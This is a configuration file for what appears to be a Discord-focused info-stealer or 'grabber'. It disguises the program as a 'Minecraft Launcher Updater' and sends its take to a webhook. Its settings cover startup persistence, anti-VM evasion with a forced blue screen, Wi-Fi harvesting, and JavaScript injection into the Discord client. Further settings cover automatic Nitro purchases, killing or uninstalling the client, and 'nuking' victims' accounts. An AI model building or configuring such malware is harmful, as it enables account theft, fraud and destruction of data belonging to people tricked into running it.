module.exports = {
  // The name the grabber will have
  name: 'Minecraft Launcher Updater',
  // The EXE name the grabber will have
  filename: 'Updater',
  webhook: {
    url: '<WEBHOOK_URL>',
    content: '@everyone',
  },
  userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
  // Should we add the grabber to the startup programs?
  addToStartup: false,
  // If the user runs the grabber from a virtual machine, should the grabber exits?
  vmProtect: false,
  // If the user runs the grabber from a virtual machine, should a BSOD be triggered?
  bsodIfVm: true,
  fakeError: false,
  wifiNetworks: false,
  discord: {
    // Inject JavaScript into the Discord desktop app
    injectJs: false,
    // Do we buy Nitro as soon as the user has launched the grabber?
    autoBuyNitro: false,
    // Do we need to uninstall the Discord desktop client?
    uninstall: false,
    // Do we need to kill the Discord desktop client process?
    killProcess: false,
    // `false` for disabling, a string with the invite code for enabling
    autoJoinGuild: false,
    nukeAccount: {
      removeAllFriends: false,
      leaveAllGuilds: false,
      deleteAllOwnedGuilds: false,
      sendMessageToAllDMs: false
    }
  }
};
